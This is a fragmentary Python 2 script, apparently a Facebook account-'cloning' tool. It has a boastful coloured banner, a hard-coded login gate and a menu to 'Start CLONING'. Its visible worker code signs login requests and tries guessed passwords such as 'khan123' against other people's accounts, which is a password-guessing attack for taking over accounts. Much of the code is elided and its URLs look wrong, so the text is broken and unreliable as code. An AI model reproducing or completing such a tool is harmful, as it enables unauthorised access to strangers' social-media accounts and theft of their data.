...
#####      #####      #####
    #      #  #       #
#####      #   #      #
 SRF_____BRAND_____CSU
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92SHANO_RAJPOOT
\033[1;96mOwner \033[1;93m: \033[1;92mSHANO_X_MANJEET
\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/srfbrand
\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/temoor.tanha.37
\033[1;96mSRF_SE_PANGA_NA_LENA_KEO_K_PAPA_HE_TUMARY
\033[1;91m======================================="""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
CorrectUsername = "srfking"
CorrectPassword = "srffaimly"
loop = 'true'
while (loop == 'true'):
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://www.facebook.com/Anonymoustricker1"
...
def menu():
	...
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH SRF"
...
def pilih_super():
	...
	def main(arg):
		...
		try:
			...
			pass
		try:
			a = requests.get('https://www.facebook.com/Anonymoustricker1')
			b = json.loads(a.text)
			pass1 = ('khan123')
